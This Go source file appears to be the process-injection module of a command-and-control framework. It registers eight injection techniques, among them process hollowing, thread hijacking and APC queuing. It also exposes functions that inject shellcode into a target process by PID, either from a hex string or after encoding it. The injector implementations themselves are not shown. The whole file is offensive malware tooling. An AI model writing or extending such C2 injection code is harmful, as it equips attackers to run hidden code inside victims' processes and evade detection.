package injection

import (
	"fmt"
	"github.com/simplified_c2/module"
)

// Module represents the process injection module
type Module struct {
	Name        string
	Description string
	Version     string
	injectors   map[string]Injector
}

// NewModule creates a new process injection module instance
func NewModule() *Module {
	m := &Module{
		Name:        "process_injection",
		Description: "Module for modern process injection techniques",
		Version:     "1.0.0",
		injectors:   make(map[string]Injector),
	}

	// Register all injectors
	m.RegisterInjector(NewCreateRemoteThreadInjector())
	m.RegisterInjector(NewNtCreateThreadExInjector())
	m.RegisterInjector(NewQueueUserAPCInjector())
	m.RegisterInjector(NewRtlCreateUserThreadInjector())
	m.RegisterInjector(NewProcessHollowingInjector())
	m.RegisterInjector(NewThreadHijackingInjector())
	m.RegisterInjector(NewUUIDInjector())
	m.RegisterInjector(NewMemoryModuleInjector())

	return m
}

func (m *Module) GetInfo() module.ModuleInfo {
	return module.ModuleInfo{
		Name:        m.Name,
		Version:     m.Version,
		Description: m.Description,
		Author:      "C2 Framework",
		Commands: []module.CommandInfo{
			{
				Name:        "inject",
				Description: "Inject code into a process",
				Usage:       "inject <pid> <code>",
				Options:     map[string]string{},
			},
		},
		Options: map[string]string{
			"enabled": "true",
		},
	}
}

// RegisterInjector registers an injector with the module
func (m *Module) RegisterInjector(injector Injector) {
	m.injectors[injector.Name()] = injector
}

// GetInjector returns an injector by name
func (m *Module) GetInjector(name string) (Injector, error) {
	injector, ok := m.injectors[name]
	if !ok {
		return nil, fmt.Errorf("injector not found: %s", name)
	}
	return injector, nil
}

// ListInjectors returns a list of all registered injectors
func (m *Module) ListInjectors() []string {
	var names []string
	for name := range m.injectors {
		names = append(names, name)
	}
	return names
}

// InjectShellcode injects shellcode using the specified technique
func (m *Module) InjectShellcode(technique string, pid int, shellcode []byte) error {
	injector, err := m.GetInjector(technique)
	if err != nil {
		return err
	}

	return injector.Inject(pid, shellcode)
}

// GetInjectorDescription returns the description of an injector
func (m *Module) GetInjectorDescription(name string) (string, error) {
	injector, err := m.GetInjector(name)
	if err != nil {
		return "", err
	}
	return injector.Description(), nil
}

// ShellcodeFromHex converts a hex string to shellcode and injects it
func (m *Module) ShellcodeFromHex(technique string, pid int, hexStr string) error {
	utils := NewShellcodeUtils()
	shellcode, err := utils.HexToShellcode(hexStr)
	if err != nil {
		return err
	}

	return m.InjectShellcode(technique, pid, shellcode)
}

// EncodeAndInjectShellcode encodes shellcode and injects it
func (m *Module) EncodeAndInjectShellcode(technique string, pid int, shellcode []byte, key byte) error {
	utils := NewShellcodeUtils()
	encoded := utils.EncodeShellcode(shellcode, key)

	// For this example, we'll decode it immediately before injection
	// In a real scenario, you might want to inject the encoded shellcode and decode it in the target process
	decoded := utils.DecodeShellcode(encoded, key)

	return m.InjectShellcode(technique, pid, decoded)
}
